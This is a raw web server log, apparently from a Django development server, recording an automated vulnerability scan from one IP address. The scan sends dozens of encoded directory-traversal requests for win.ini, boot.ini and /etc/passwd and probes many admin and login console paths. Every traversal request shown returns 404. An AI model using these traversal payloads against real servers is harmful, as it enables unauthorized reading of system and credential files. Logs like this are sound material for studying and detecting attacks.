+[08/Oct/2023 04:34:26] "GET /servlet/SnoopServlet/ HTTP/1.1" 404 5346
+Not Found: /servlet/snoopservlet/
+[08/Oct/2023 04:34:26] "GET /servlet/snoopservlet/ HTTP/1.1" 404 5346
+[08/Oct/2023 04:34:26] "GET / HTTP/1.1" 200 35341
+Not Found: /servlet/snoop/
+[08/Oct/2023 04:34:27] "GET /servlet/snoop/ HTTP/1.1" 404 5325
+Not Found: /triton-help/en/first.htm
+[08/Oct/2023 04:34:27] "GET /triton-help/en/first.htm HTTP/1.1" 404 5355
+[08/Oct/2023 04:34:27,132] - Broken pipe from ('130.253.1.147', 38982)
+
+[08/Oct/2023 04:34:27] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:27,241] - Broken pipe from ('130.253.1.147', 40762)
+
+[08/Oct/2023 04:34:27] "GET / HTTP/1.1" 200 35341
+Not Found: /console/login/LoginForm.jsp
+[08/Oct/2023 04:34:27] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 5364
+Forbidden (CSRF cookie not set.): /
+[08/Oct/2023 04:34:27] "SEARCH / HTTP/1.1" 403 2870
+Not Found: /wls-wsat/CoordinatorPortType
+[08/Oct/2023 04:34:27] "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 5367
+[08/Oct/2023 04:34:27,697] - Broken pipe from ('130.253.1.147', 41050)
+
+[08/Oct/2023 04:34:27,699] - Broken pipe from ('130.253.1.147', 41108)
+
+[08/Oct/2023 04:34:27] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:27] "GET / HTTP/1.1" 200 35341
+Forbidden (CSRF cookie not set.): /
+[08/Oct/2023 04:34:28] "PROPFIND / HTTP/1.1" 403 2870
+Not Found: /*
+[08/Oct/2023 04:34:28] "OPTIONS * HTTP/1.1" 404 1763
+[08/Oct/2023 04:34:28,630] - Broken pipe from ('130.253.1.147', 41580)
+
+[08/Oct/2023 04:34:28,631] - Broken pipe from ('130.253.1.147', 41584)
+
+[08/Oct/2023 04:34:28] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:28] "GET / HTTP/1.1" 200 35341
+Not Found: /active.log
+[08/Oct/2023 04:34:29] "GET /active.log HTTP/1.1" 404 5313
+Not Found: /../../../../../../../../../../../../windows/win.ini
+[08/Oct/2023 04:34:29] "GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 5400
+[08/Oct/2023 04:34:29,159] - Broken pipe from ('130.253.1.147', 42612)
+
+Not Found: /../../../../../../../../../../../../winnt/win.ini
+[08/Oct/2023 04:34:29] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:29] "GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 5394
+Not Found: /..../../../../../../../../../../../windows/win.ini
+[08/Oct/2023 04:34:29] "GET ../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 1873
+Not Found: /images
+[08/Oct/2023 04:34:29] "GET /images HTTP/1.0" 404 5301
+Not Found: /..../../../../../../../../../../../winnt/win.ini
+[08/Oct/2023 04:34:29] "GET ../../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 1867
+[08/Oct/2023 04:34:29,532] - Broken pipe from ('130.253.1.147', 42978)
+
+[08/Oct/2023 04:34:29] "GET / HTTP/1.1" 200 35341
+Not Found: /..\..\..\..\..\..\..\..\..\..\windows\win.ini
+[08/Oct/2023 04:34:29] "GET ..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1" 404 1924
+Not Found: /..\..\..\..\..\..\..\..\..\..\winnt\win.ini
+Not Found: /main_internet.php
+[08/Oct/2023 04:34:29] "GET ..\..\..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 404 1918
+[08/Oct/2023 04:34:29] "GET /main_internet.php HTTP/1.1" 404 5334
+[08/Oct/2023 04:34:29,998] - Broken pipe from ('130.253.1.147', 43366)
+
+Not Found: /..\..\..\..\..\..\..\..\..\..\windows\win.ini
+[08/Oct/2023 04:34:30] "GET /..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1" 404 5440
+[08/Oct/2023 04:34:30] "GET / HTTP/1.1" 200 35341
+Not Found: /..\..\..\..\..\..\..\..\..\..\winnt\win.ini
+[08/Oct/2023 04:34:30] "GET /..\..\..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 404 5434
+Not Found: /auth/login
+[08/Oct/2023 04:34:30] "GET /auth/login HTTP/1.1" 404 5313
+Not Found: /\..\..\..\..\..\..\..\..\..\windows\win.ini
+[08/Oct/2023 04:34:30,424] - Broken pipe from ('130.253.1.147', 43826)
+
+[08/Oct/2023 04:34:30] "GET /%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini HTTP/1.1" 404 5434
+[08/Oct/2023 04:34:30] "GET / HTTP/1.1" 200 35341
+Not Found: /\..\..\..\..\..\..\..\..\..\winnt\win.ini
+[08/Oct/2023 04:34:30] "GET /%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini HTTP/1.1" 404 5428
+Not Found: /\..\..\..\..\..\..\..\..\..\windows\win.ini
+[08/Oct/2023 04:34:30] "GET /%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin%2eini HTTP/1.1" 404 5434
+Not Found: /cfg/shortcuts
+[08/Oct/2023 04:34:30] "GET /cfg/shortcuts HTTP/1.1" 404 5322
+Not Found: /\..\..\..\..\..\..\..\..\..\winnt\win.ini
+Not Found: /hc/error/
+[08/Oct/2023 04:34:30] "GET /%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin%2eini HTTP/1.1" 404 5428
+[08/Oct/2023 04:34:30] "GET /hc/error/ HTTP/1.1" 404 5310
+[08/Oct/2023 04:34:30,957] - Broken pipe from ('130.253.1.147', 44276)
+
+[08/Oct/2023 04:34:30] "GET / HTTP/1.1" 200 35341
+Not Found: //../../../../../../../../../windows/win.ini
+[08/Oct/2023 04:34:31] "GET /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini HTTP/1.1" 404 5384
+[08/Oct/2023 04:34:31] "GET / HTTP/1.1" 200 35341
+Not Found: /ui/login.action
+[08/Oct/2023 04:34:31] "GET /ui/login.action HTTP/1.1" 404 5328
+Not Found: //../../../../../../../../../winnt/win.ini
+[08/Oct/2023 04:34:31] "GET /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwinnt%2fwin.ini HTTP/1.1" 404 5378
+[08/Oct/2023 04:34:31,955] - Broken pipe from ('130.253.1.147', 44690)
+
+Not Found: /login
+[08/Oct/2023 04:34:32] "GET /login HTTP/1.1" 404 5298
+Not Found: /.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./windows/win.ini
+[08/Oct/2023 04:34:32] "GET /.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./windows/win.ini HTTP/1.1" 404 5482
+[08/Oct/2023 04:34:32] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:32,221] - Broken pipe from ('130.253.1.147', 44842)
+
+[08/Oct/2023 04:34:32] "GET / HTTP/1.1" 200 35341
+Not Found: /.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./winnt/win.ini
+[08/Oct/2023 04:34:32] "GET /.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./winnt/win.ini HTTP/1.1" 404 5476
+Not Found: /hc/admin/login/
+[08/Oct/2023 04:34:32] "GET /hc/admin/login/ HTTP/1.1" 404 5328
+Not Found: /login
+[08/Oct/2023 04:34:32] "GET /login HTTP/1.1" 404 5298
+Not Found: /../../../../../../../../../../../windows/win.ini
+[08/Oct/2023 04:34:32] "GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1" 404 5394
+[08/Oct/2023 04:34:33,039] - Broken pipe from ('130.253.1.147', 46044)
+
+[08/Oct/2023 04:34:33,040] - Broken pipe from ('130.253.1.147', 46198)
+
+Not Found: /../../../../../../../../../../../winnt/win.ini
+[08/Oct/2023 04:34:33] "GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini HTTP/1.1" 404 5388
+[08/Oct/2023 04:34:33] "GET / HTTP/1.1" 200 35341
+Not Found: /..\..\..\..\..\..\..\..\..\..\windows\win.ini
+[08/Oct/2023 04:34:33] "GET /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\windows\win.ini HTTP/1.1" 404 5440
+[08/Oct/2023 04:34:33] "GET / HTTP/1.1" 200 35341
+Not Found: /..\..\..\..\..\..\..\..\..\..\winnt\win.ini
+[08/Oct/2023 04:34:33] "GET /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\winnt\win.ini HTTP/1.1" 404 5434
+Not Found: /qip
+[08/Oct/2023 04:34:33] "GET /qip HTTP/1.1" 404 5292
+[08/Oct/2023 04:34:33] "GET / HTTP/1.1" 200 35341
+Not Found: /..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+[08/Oct/2023 04:34:33] "GET /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini HTTP/1.1" 404 5451
+[08/Oct/2023 04:34:33,743] - Broken pipe from ('130.253.1.147', 47200)
+
+Not Found: /qip
+[08/Oct/2023 04:34:33] "GET /qip HTTP/1.1" 404 5292
+Not Found: /\..\..\..\..\..\..\..\..\..\..\..\winnt\win.ini
+[08/Oct/2023 04:34:33] "GET %5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini HTTP/1.1" 404 1936
+[08/Oct/2023 04:34:33] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:34,021] - Broken pipe from ('130.253.1.147', 47190)
+
+Not Found: /.../.../.../.../.../.../.../.../.../windows/win.ini
+[08/Oct/2023 04:34:34] "GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1" 404 5436
+[08/Oct/2023 04:34:34] "GET / HTTP/1.1" 200 35341
+Not Found: /.../.../.../.../.../.../.../.../.../winnt/win.ini
+[08/Oct/2023 04:34:34] "GET /.../.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1" 404 5430
+[08/Oct/2023 04:34:34] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:34] "GET / HTTP/1.1" 200 35341
+Not Found: /...\...\...\...\...\...\...\...\...\windows\win.ini
+[08/Oct/2023 04:34:34] "GET /...\...\...\...\...\...\...\...\...\windows\win.ini HTTP/1.1" 404 5456
+[08/Oct/2023 04:34:34,533] - Broken pipe from ('130.253.1.147', 47882)
+
+[08/Oct/2023 04:34:34] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:34,700] - Broken pipe from ('130.253.1.147', 48070)
+
+Not Found: /...\...\...\...\...\...\...\...\...\winnt\win.ini
+[08/Oct/2023 04:34:34] "GET /...\...\...\...\...\...\...\...\...\winnt\win.ini HTTP/1.1" 404 5450
+[08/Oct/2023 04:34:34] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:34] "GET / HTTP/1.1" 200 35341
+Not Found: /..../..../..../..../..../..../..../..../..../windows/win.ini
+[08/Oct/2023 04:34:34] "GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.1" 404 5463
+[08/Oct/2023 04:34:35,011] - Broken pipe from ('130.253.1.147', 48638)
+
+Not Found: /..../..../..../..../..../..../..../..../..../winnt/win.ini
+[08/Oct/2023 04:34:35] "GET /..../..../..../..../..../..../..../..../..../winnt/win.ini HTTP/1.1" 404 5457
+Not Found: /portal/diag/index.jsp
+[08/Oct/2023 04:34:35] "GET /portal/diag/index.jsp HTTP/1.1" 404 5346
+[08/Oct/2023 04:34:35] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:35,273] - Broken pipe from ('130.253.1.147', 48946)
+
+Not Found: /....\....\....\....\....\....\....\....\....\windows\win.ini
+[08/Oct/2023 04:34:35] "GET /....\....\....\....\....\....\....\....\....\windows\win.ini HTTP/1.1" 404 5483
+[08/Oct/2023 04:34:35] "GET / HTTP/1.1" 200 35341
+Not Found: /....\....\....\....\....\....\....\....\....\winnt\win.ini
+[08/Oct/2023 04:34:35] "GET /....\....\....\....\....\....\....\....\....\winnt\win.ini HTTP/1.1" 404 5477
+Not Found: /menu.htm
+[08/Oct/2023 04:34:35] "GET /menu.htm HTTP/1.1" 404 5307
+Not Found: /someunexistantstuff17979150391343556052.html
+[08/Oct/2023 04:34:35] "HEAD /someunexistantstuff17979150391343556052.html HTTP/1.1" 404 5416
+Not Found: /././././././../../../../../windows/win.ini
+[08/Oct/2023 04:34:35] "GET /././././././../../../../../windows/win.ini HTTP/1.1" 404 5382
+[08/Oct/2023 04:34:35,701] - Broken pipe from ('130.253.1.147', 49240)
+
+Not Found: /././././././../../../../../winnt/win.ini
+[08/Oct/2023 04:34:35] "GET /././././././../../../../../winnt/win.ini HTTP/1.1" 404 5376
+[08/Oct/2023 04:34:35] "GET / HTTP/1.1" 200 35341
+Not Found: /someunexistantstuff.exe
+[08/Oct/2023 04:34:35] "HEAD /someunexistantstuff.exe HTTP/1.1" 404 5353
+Not Found: /.\.\.\.\.\.\.\.\.\.\windows/win.ini
+[08/Oct/2023 04:34:35] "GET .\.\.\.\.\.\.\.\.\.\/windows/win.ini HTTP/1.1" 404 1893
+Not Found: /someunexistantantsutff12497485001134181196.html
+Not Found: /.\.\.\.\.\.\.\.\.\.\winnt/win.ini
+[08/Oct/2023 04:34:35] "GET /someunexistantantsutff12497485001134181196.html HTTP/1.1" 404 5424
+[08/Oct/2023 04:34:35] "GET .\.\.\.\.\.\.\.\.\.\/winnt/win.ini HTTP/1.1" 404 1887
+Not Found: /auth/login
+[08/Oct/2023 04:34:35] "GET /auth/login HTTP/1.1" 404 5313
+Not Found: /nessus\..\..\..\..\..\..\windows\win.ini
+[08/Oct/2023 04:34:35] "GET /nessus\..\..\..\..\..\..\windows\win.ini HTTP/1.1" 404 5419
+Not Found: /someunexistantantsutff.exe
+[08/Oct/2023 04:34:35] "GET /someunexistantantsutff.exe HTTP/1.1" 404 5361
+[08/Oct/2023 04:34:36,339] - Broken pipe from ('130.253.1.147', 49492)
+
+[08/Oct/2023 04:34:36,339] - Broken pipe from ('130.253.1.147', 49932)
+
+Not Found: /nessus\..\..\..\..\..\..\winnt\win.ini
+[08/Oct/2023 04:34:36] "GET /nessus\..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 404 5413
+[08/Oct/2023 04:34:36] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:36] "GET / HTTP/1.1" 200 35341
+Not Found: /%80../%80../%80../%80../%80../%80../windows/win.ini
+[08/Oct/2023 04:34:36] "GET /%80../%80../%80../%80../%80../%80../windows/win.ini HTTP/1.1" 404 5448
+Not Found: /ui/
+[08/Oct/2023 04:34:36] "GET /ui/ HTTP/1.1" 404 5292
+Not Found: /%80../%80../%80../%80../%80../%80../winnt/win.ini
+Not Found: /VncViewer.jar
+[08/Oct/2023 04:34:36] "GET /%80../%80../%80../%80../%80../%80../winnt/win.ini HTTP/1.1" 404 5442
+[08/Oct/2023 04:34:36] "GET /VncViewer.jar HTTP/1.1" 404 5322
+[08/Oct/2023 04:34:36,720] - Broken pipe from ('130.253.1.147', 50656)
+
+Not Found: /%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini
+[08/Oct/2023 04:34:36] "GET /%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./windows/win.ini HTTP/1.1" 404 5483
+Forbidden (CSRF cookie not set.): /
+Not Found: /ui/
+[08/Oct/2023 04:34:36] "GET /ui/ HTTP/1.1" 404 5292
+[08/Oct/2023 04:34:36] "POST / HTTP/1.0" 403 2870
+Not Found: /%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini
+[08/Oct/2023 04:34:36] "GET /%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./winnt/win.ini HTTP/1.1" 404 5477
+Not Found: /%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini
+[08/Oct/2023 04:34:37] "GET /%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/windows/win.ini HTTP/1.1" 404 5452
+Not Found: /recoveryconsole/
+[08/Oct/2023 04:34:37] "GET /recoveryconsole/ HTTP/1.1" 404 5331
+[08/Oct/2023 04:34:37] "GET / HTTP/1.1" 200 35341
+Not Found: /%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini
+[08/Oct/2023 04:34:37] "GET /%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/winnt/win.ini HTTP/1.1" 404 5446
+[08/Oct/2023 04:34:37,283] - Broken pipe from ('130.253.1.147', 50652)
+
+Not Found: /login.html
+[08/Oct/2023 04:34:37] "GET /login.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:37] "GET / HTTP/1.1" 200 35341
+Not Found: /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/windows/win.ini
+[08/Oct/2023 04:34:37] "GET /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/windows/win.ini HTTP/1.1" 404 5844
+[08/Oct/2023 04:34:37,359] - Broken pipe from ('130.253.1.147', 51414)
+
+[08/Oct/2023 04:34:37] "GET // HTTP/1.1" 200 35341
+Not Found: /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/winnt/win.ini
+[08/Oct/2023 04:34:37] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:37] "GET /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/winnt/win.ini HTTP/1.1" 404 5838
+[08/Oct/2023 04:34:37,752] - Broken pipe from ('130.253.1.147', 51590)
+
+[08/Oct/2023 04:34:37] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:37] "GET / HTTP/1.1" 200 35341
+Not Found: /scripts/fake.cgi
+[08/Oct/2023 04:34:38] "GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 5389
+Not Found: /scripts/fake.cgi
+Not Found: /mdm/web/login.htm
+[08/Oct/2023 04:34:38] "GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 5387
+[08/Oct/2023 04:34:38] "GET /mdm/web/login.htm HTTP/1.1" 404 5334
+Not Found: /logon.jsp
+[08/Oct/2023 04:34:38] "GET /logon.jsp HTTP/1.1" 404 5310
+Not Found: /officescan/console/html/common/l10n/l10n.global.js
+[08/Oct/2023 04:34:38] "GET /officescan/console/html/common/l10n/l10n.global.js HTTP/1.1" 404 5433
+[08/Oct/2023 04:34:38,524] - Broken pipe from ('130.253.1.147', 51700)
+
+Not Found: /scripts/fake.cgi
+[08/Oct/2023 04:34:38] "GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1" 404 5387
+[08/Oct/2023 04:34:38] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:38,639] - Broken pipe from ('130.253.1.147', 52262)
+
+[08/Oct/2023 04:34:38,649] - Broken pipe from ('130.253.1.147', 52058)
+
+Not Found: /scripts/fake.cgi
+[08/Oct/2023 04:34:38] "GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini HTTP/1.1" 404 5385
+[08/Oct/2023 04:34:38] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:38] "GET / HTTP/1.1" 200 35341
+Not Found: /../../../../../../../../../../../../etc/passwd
+[08/Oct/2023 04:34:38] "GET /../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 5385
+Not Found: /webapp/js/UI_String.en-US.js
+[08/Oct/2023 04:34:39] "GET /webapp/js/UI_String.en-US.js HTTP/1.1" 404 5367
+Not Found: /webpages/
+[08/Oct/2023 04:34:39] "GET /webpages/ HTTP/1.1" 404 5310
+Not Found: /./../../../../../../../../../../../etc/passwd
+[08/Oct/2023 04:34:39] "GET /./../../../../../../../../../../../etc/passwd HTTP/1.1" 404 5383
+Not Found: /ldap/cgi-bin/ldacgi.exe
+[08/Oct/2023 04:34:39] "GET /ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252 HTTP/1.1" 404 5450
+[08/Oct/2023 04:34:39,342] - Broken pipe from ('130.253.1.147', 52790)
+
+Not Found: /webpages/index.html
+[08/Oct/2023 04:34:39] "GET /webpages/index.html HTTP/1.1" 404 5340
+[08/Oct/2023 04:34:39] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:39,490] - Broken pipe from ('130.253.1.147', 53036)
+
+Not Found: /../../../../../../../../../../../../etc/passwd
+[08/Oct/2023 04:34:39] "GET //../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 5385
+[08/Oct/2023 04:34:39] "GET / HTTP/1.1" 200 35341
+Not Found: /webpages/login.html
+[08/Oct/2023 04:34:39] "GET /webpages/login.html HTTP/1.1" 404 5340
+[08/Oct/2023 04:34:39,852] - Broken pipe from ('130.253.1.147', 52952)
+
+Not Found: /tightvnc-jviewer.jar
+[08/Oct/2023 04:34:39] "GET /tightvnc-jviewer.jar HTTP/1.1" 404 5343
+Not Found: /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd
+[08/Oct/2023 04:34:39] "GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1" 404 5493
+Not Found: /VncViewer.jar
+[08/Oct/2023 04:34:39] "GET /VncViewer.jar HTTP/1.1" 404 5322
+[08/Oct/2023 04:34:39] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:40,084] - Broken pipe from ('130.253.1.147', 53624)
+
+[08/Oct/2023 04:34:40,085] - Broken pipe from ('130.253.1.147', 53740)
+
+Not Found: /../../../../../../../../../../../../etc/passwd
+[08/Oct/2023 04:34:40] "GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 404 5385
+[08/Oct/2023 04:34:40] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:40] "GET / HTTP/1.1" 200 35341
+Not Found: /spotfire/about.jsp
+[08/Oct/2023 04:34:40] "GET /spotfire/about.jsp HTTP/1.1" 404 5337
+Not Found: /../../../../../../../../../../../../etc/passwd
+[08/Oct/2023 04:34:40] "GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1" 404 5385
+Not Found: /jasperserver-pro/login.html
+[08/Oct/2023 04:34:40] "GET /jasperserver-pro/login.html HTTP/1.1" 404 5364
+[08/Oct/2023 04:34:40] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:40,429] - Broken pipe from ('130.253.1.147', 54122)
+
+Not Found: /c:\boot.ini
+[08/Oct/2023 04:34:40] "GET c:\boot.ini HTTP/1.1" 404 1786
+Not Found: /./../../../../../../../../../../../etc/passwd
+[08/Oct/2023 04:34:40] "GET /.%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1" 404 5383
+[08/Oct/2023 04:34:40,523] - Broken pipe from ('130.253.1.147', 54328)
+
+Invalid HTTP_HOST header: 'kimlab01-vlp.du.edu/..:17778'. The domain name provided is not valid according to RFC 1034/1035.
+[08/Oct/2023 04:34:40] "GET / HTTP/1.1" 200 35341
+Bad Request: /
+[08/Oct/2023 04:34:40] "GET / HTTP/1.1" 400 61569
+Not Found: /../../../../../../../../../../../../etc/passwd
+[08/Oct/2023 04:34:40] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1" 404 5385
+[08/Oct/2023 04:34:40] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:40,930] - Broken pipe from ('130.253.1.147', 54332)
+
+Not Found: /././././././../../../../../etc/passwd
+[08/Oct/2023 04:34:40] "GET /././././././../../../../../etc/passwd HTTP/1.1" 404 5367
+Not Found: /etc/passwd
+[08/Oct/2023 04:34:41] "GET /etc/passwd HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:41] "GET / HTTP/1.1" 200 35341
+Not Found: /tos/index.php
+[08/Oct/2023 04:34:41] "GET /tos/index.php?user/login HTTP/1.1" 404 5333
+Not Found: /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd
+[08/Oct/2023 04:34:41] "GET /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd HTTP/1.1" 404 5829
+Not Found: /tos/
+[08/Oct/2023 04:34:41] "GET /tos/ HTTP/1.1" 404 5295
+Not Found: /etc/passwd
+[08/Oct/2023 04:34:41] "GET //etc/passwd HTTP/1.1" 404 5313
+Not Found: /auth/login
+[08/Oct/2023 04:34:41] "GET /auth/login HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:41,551] - Broken pipe from ('130.253.1.147', 54824)
+
+[08/Oct/2023 04:34:41,554] - Broken pipe from ('130.253.1.147', 54790)
+
+Not Found: /scripts/fake.cgi
+[08/Oct/2023 04:34:41] "GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd HTTP/1.1" 404 5369
+[08/Oct/2023 04:34:41] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:41,926] - Broken pipe from ('130.253.1.147', 55322)
+
+[08/Oct/2023 04:34:42] "GET / HTTP/1.1" 200 35341
+Not Found: /scripts/fake.cgi
+[08/Oct/2023 04:34:42] "GET /scripts/fake.cgi?arg=/dir/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 404 5386
+[08/Oct/2023 04:34:42] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:42] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:42,123] - Broken pipe from ('130.253.1.147', 42614)
+
+[08/Oct/2023 04:34:42] "GET / HTTP/1.1" 200 35341
+Not Found: /brightmail/viewLogin.do
+Not Found: /webui/apps/sdcss
+[08/Oct/2023 04:34:42] "GET /brightmail/viewLogin.do HTTP/1.1" 404 5352
+[08/Oct/2023 04:34:42] "POST /webui/apps/sdcss HTTP/1.1" 404 5332
+[08/Oct/2023 04:34:42,450] - Broken pipe from ('130.253.1.147', 55920)
+
+Not Found: /.svn/entries
+[08/Oct/2023 04:34:42] "GET /.svn/entries HTTP/1.1" 404 5313
+[08/Oct/2023 04:34:42,637] - Broken pipe from ('130.253.1.147', 56294)
+
+[08/Oct/2023 04:34:42,638] - Broken pipe from ('130.253.1.147', 56352)
+
+[08/Oct/2023 04:34:42] "GET / HTTP/1.1" 200 35341
+Not Found: /..\..\..\..\..\..\windows\win.ini
+[08/Oct/2023 04:34:42] "GET ..\..\..\..\..\..\windows\win.ini HTTP/1.1" 404 1876
+[08/Oct/2023 04:34:42] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:34:43] "GET / HTTP/1.1" 200 35341
+Not Found: /..\..\..\..\..\..\winnt\win.ini
+[08/Oct/2023 04:34:43] "GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1" 404 1870
+Not Found: /index.jsp
+[08/Oct/2023 04:34:43] "GET /index.jsp HTTP/1.1" 404 5310
+Not Found: /idm/login.jsp
